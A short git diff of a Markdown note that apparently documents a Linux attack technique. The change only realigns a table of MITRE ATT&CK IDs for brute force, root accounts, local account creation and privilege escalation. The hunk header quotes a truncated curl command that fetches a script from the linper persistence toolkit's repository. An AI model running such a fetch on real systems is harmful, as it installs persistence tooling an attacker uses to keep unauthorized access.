@@ -138,9 +138,9 @@ _`/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linp
 
 ## Related Techniques
 
-|Technique|ID|
-|---|---|
-|Brute Force|T1110|
-|Valid Accounts (Root)|T1078|
-|Create Local Account|T1136.001|
-|Privilege Escalation|T1068|
+| Technique             | ID        |
+| --------------------- | --------- |
+| Brute Force           | T1110     |
+| Valid Accounts (Root) | T1078     |
+| Create Local Account  | T1136.001 |
+| Privilege Escalation  | T1068     |
